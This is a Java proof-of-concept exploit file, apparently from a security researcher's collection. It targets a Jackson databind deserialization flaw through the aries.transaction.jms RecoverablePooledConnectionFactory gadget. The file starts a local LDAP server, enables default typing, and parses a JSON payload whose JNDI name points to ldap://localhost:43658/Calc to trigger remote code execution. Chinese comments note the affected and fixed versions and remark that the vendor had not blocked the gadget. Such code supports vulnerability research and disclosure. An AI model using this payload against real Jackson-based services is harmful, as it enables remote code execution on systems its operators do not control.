package com.threedr3am.bug.jackson.rce;

import com.fasterxml.jackson.databind.ObjectMapper;
import com.threedr3am.bug.common.server.LdapServer;
import java.io.IOException;

/**
 * 比较鸡肋，需要调用writeValueAsString才能触发
 *
 * Reporter: 官方没禁，捡漏时间到了
 *
 * Fix will be included in:
 *
 * 2.9.10.4
 * Does not affect 2.10.0 and later
 *
 * aries.transaction.jms gadget
 *
 * <dependency>
 *     <groupId>org.apache.aries.transaction</groupId>
 *     <artifactId>org.apache.aries.transaction.jms</artifactId>
 *     <version>2.0.0</version>
 * </dependency>
 *
 * @author threedr3am
 */
public class AriesJMSPoc {

  static {
    //rmi server示例
//    RmiServer.run();

    //ldap server示例
    LdapServer.run();
  }

  public static void main(String[] args) throws IOException {
    ObjectMapper mapper = new ObjectMapper();
    mapper.enableDefaultTyping();

    String json = "[\"org.apache.aries.transaction.jms.RecoverablePooledConnectionFactory\", {\"tmJndiName\": \"ldap://localhost:43658/Calc\", \"tmFromJndi\": true}]";
    Object o = mapper.readValue(json, Object.class);
    mapper.writeValueAsString(o);
  }


}
